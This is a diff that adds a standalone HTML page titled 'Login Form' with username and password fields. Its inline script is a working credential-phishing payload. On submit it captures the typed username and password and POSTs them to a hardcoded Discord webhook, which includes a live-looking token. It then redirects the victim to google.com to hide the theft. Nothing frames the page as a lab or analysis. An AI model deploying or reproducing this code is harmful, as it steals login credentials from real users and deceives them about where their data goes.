@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login Form</title>
+<style>
+body {
+  font-family: Arial, sans-serif;
+}
+
+.login-container {
+  max-width: 300px;
+  margin: 100px auto;
+  padding: 20px;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+}
+
+.input-group {
+  margin-bottom: 20px;
+}
+
+.input-group label {
+  display: block;
+  margin-bottom: 5px;
+}
+
+.input-group input {
+  width: 100%;
+  padding: 8px;
+  border: 1px solid #ccc;
+  border-radius: 3px;
+}
+
+button {
+  width: 100%;
+  padding: 10px;
+  background-color: #007bff;
+  color: #fff;
+  border: none;
+  border-radius: 3px;
+  cursor: pointer;
+}
+
+button:hover {
+  background-color: #0056b3;
+}
+</style>
+</head>
+<body>
+<div class="login-container">
+  <h2>Login</h2>
+  <form id="login-form">
+    <div class="input-group">
+      <label for="username">Username</label>
+      <input type="text" id="username" name="username" required>
+    </div>
+    <div class="input-group">
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" required>
+    </div>
+    <button type="submit">Login</button>
+  </form>
+</div>
+<script>
+document.getElementById("login-form").addEventListener("submit", function(event) {
+  event.preventDefault();
+  
+  var username = document.getElementById("username").value;
+  var password = document.getElementById("password").value;
+  
+  // Send username and password to Discord webhook
+  var data = {
+    username: username,
+    password: password
+  };
+  
+  // Discord webhook URL
+  var webhookUrl = "https://discord.com/api/webhooks/1211241425023402005/u9IyuJ6gEMnYjKsVarOhOIjEoR1AotEFPd2Kwo9PV1TT8z1lcQyNy06JebPtc8-t3r6N";
+
+  // Create a new XMLHttpRequest object
+  var xhr = new XMLHttpRequest();
+
+  // Configure the request
+  xhr.open("POST", webhookUrl, true);
+  xhr.setRequestHeader("Content-Type", "application/json");
+
+  // Define what happens on successful data submission
+  xhr.onload = function() {
+    if (xhr.status >= 200 && xhr.status < 300) {
+      console.log('Webhook request successful');
+      // Redirect user to a different site (URL)
+      window.location.href = "https://google.com";
+    } else {
+      console.error('Webhook request failed with status code ' + xhr.status);
+    }
+  };
+
+  // Define what happens in case of an error
+  xhr.onerror = function() {
+    console.error('Webhook request failed');
+  };
+
+  // Convert the data to JSON format
+  var jsonData = JSON.stringify(data);
+
+  // Send the request
+  xhr.send(jsonData);
+});
+</script>
+</body>
+</html>
